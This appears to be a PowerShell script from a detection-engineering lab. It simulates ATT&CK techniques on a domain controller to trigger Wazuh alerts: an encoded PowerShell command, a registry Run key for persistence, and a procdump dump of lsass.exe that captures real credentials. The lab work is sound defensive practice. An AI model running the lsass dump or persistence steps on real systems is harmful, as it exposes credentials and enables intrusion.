<#
.SYNOPSIS
    Attack Simulation & Detection Engineering Lab - Windows-side (Azure DC)
    simulations. Run ONE technique at a time, not all at once, so each
    Wazuh alert is unambiguous about which simulation triggered it.
    See ../README.md for the safety note on the credential-access
    technique (procdump against lsass.exe) before running it.

.PARAMETER Technique
    execution | persistence | persistence-cleanup | credential-access

.EXAMPLE
    .\windows-simulations.ps1 -Technique execution
#>
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("execution", "persistence", "persistence-cleanup", "credential-access")]
    [string]$Technique
)

switch ($Technique) {
    "execution" {
        # T1059.001: PowerShell -EncodedCommand
        $cmd = "whoami; hostname"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $encoded = [Convert]::ToBase64String($bytes)
        powershell.exe -EncodedCommand $encoded
    }
    "persistence" {
        # T1547.001: registry Run key
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdaterSvc /t REG_SZ /d "C:\Windows\Temp\update.exe" /f
        Write-Host "Registry Run key added. Capture the Wazuh/Sysmon alert, then run:"
        Write-Host "  .\windows-simulations.ps1 -Technique persistence-cleanup"
    }
    "persistence-cleanup" {
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdaterSvc /f
        Write-Host "Registry Run key removed."
    }
    "credential-access" {
        # T1003.001: procdump against lsass.exe - legitimate, signed
        # Sysinternals tool, same technique real attackers use. Requires
        # procdump.exe on PATH (download from Sysinternals if not
        # present). The resulting .dmp file contains REAL credential
        # material from this DC's memory - do not open or parse it.
        Write-Host "WARNING: lsass.dmp will contain real credential material." -ForegroundColor Yellow
        Write-Host "Capture the Wazuh/Sysmon alert, then delete it immediately." -ForegroundColor Yellow
        procdump.exe -accepteula -ma lsass.exe lsass.dmp
        Write-Host "Now run: del /f lsass.dmp"
    }
}
